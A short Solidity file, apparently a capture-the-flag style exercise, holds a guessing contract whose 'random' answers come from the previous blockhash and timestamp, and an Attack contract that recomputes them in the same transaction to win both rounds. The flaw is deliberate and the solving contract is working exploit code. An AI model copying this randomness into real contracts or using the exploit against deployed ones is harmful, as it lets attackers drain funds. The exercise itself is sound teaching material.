/// 可预测的随机数

/// @description 分别猜中两个随机数。
//SPDX-License-Identifier:UNLICENSED
pragma solidity ^0.8.0;
contract Blocker{
    uint256 public guessFlag;
    uint8 guess;
    uint256 settlementBlockNumber;
    bytes32 public  _bytesAnwser;
    uint8 public _uint8Anwser;
    address public winner;

    function guesser(bytes32 n) public payable {
        require(msg.value == 0.001 ether);
        bytes32 answer = keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp));
        if (n == answer && guessFlag==0) {
            guessFlag+=5;
            _bytesAnwser = n;
        }
    }

    function guessed(uint8 n) public {
        require(block.number > settlementBlockNumber,"try again later");
        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))) % 10;
        if (n == answer && guessFlag==5) {
            guessFlag+=5;
            _uint8Anwser = n;
            winner = msg.sender;
        }
    }

    
}

contract Attack{
    Blocker public che;
    bool public flag;
    constructor(address _che){
        che = Blocker(_che);
    }

    function complete1()public payable{
        bytes32 answer = keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp));
        che.guesser{value:msg.value}(answer);
    }
    //持续调用直到flag为true
    function complete2() public payable{
        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))) % 10;
        che.guessed(answer);
    }
    receive()external payable{}
}
